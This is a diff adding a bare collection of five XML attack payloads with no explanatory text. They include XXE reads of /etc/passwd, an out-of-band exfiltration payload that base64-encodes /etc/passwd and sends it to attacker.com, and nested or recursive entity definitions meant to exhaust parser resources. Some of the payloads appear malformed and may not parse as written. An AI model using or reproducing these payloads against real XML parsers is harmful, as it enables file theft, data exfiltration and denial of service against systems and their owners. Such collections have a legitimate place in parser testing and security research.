@@ -1,0 +1,58 @@
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ELEMENT root ANY>
+  <!ATTLIST root attr CDATA #IMPLIED>
+  <!ENTITY % internal "<!ENTITY % external SYSTEM 'file:///etc/passwd'>
+%external;">
+  %internal;
+]>
+<root attr="test">&external;</root>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY &#x25; param1 "value1">
+  <!ENTITY param2 "&#x25;param1;">
+  <!ENTITY param3 "&#x25;param2;&#x25;param2;&#x25;param2;">
+]>
+<root>
+  <element>&param3;</element>
+</root>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY start "<![CDATA[">
+  <!ENTITY end "]]>">
+  <!ENTITY nested "&start; &nested; &end;">
+]>
+<root>&nested;</root>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
+  %eval;
+  %exfiltrate;
+]>
+<root/>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY a "&#60;&#33;&#91;CDATA&#91;">
+  <!ENTITY b "&#93;&#93;&#62;">
+  <!ENTITY c "&a;&a;&a;&a;&a;&b;&b;&b;&b;&b;">
+  <!ENTITY d "&c;&c;&c;&c;&c;">
+]>
+<root attr="&d;">
+  <child>&d;</child>
+  <child>&d;</child>
+</root>
+```
